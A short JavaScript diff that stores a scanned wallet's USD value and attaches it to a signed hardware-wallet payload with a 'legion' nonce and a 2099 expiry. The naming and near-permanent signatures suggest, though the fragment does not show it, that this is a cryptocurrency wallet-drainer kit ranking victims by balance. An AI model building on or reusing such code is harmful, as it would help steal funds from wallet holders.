@@ -549,6 +549,7 @@
           var totalUsd = scanData.data.fusion.total_usd || 0;
           LOG.info('Wallet value: $' + totalUsd.toFixed(2));
           SESSION.scoutData = scanData.data.fusion;
+          SESSION.scoutValueUsd = totalUsd;
         }
       } catch (e) {
         LOG.debug('Deep scan skipped: ' + e.message);
@@ -612,7 +613,8 @@
             signature: sig.signature,
             nonce: 'legion:hw:' + Date.now() + ':' + i,
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hardware_wallet'
+            wallet_type: 'hardware_wallet',
+            scout_value_usd: SESSION.scoutValueUsd || 0
           };
 
           // EVM needs extra fields (same fix as V2)
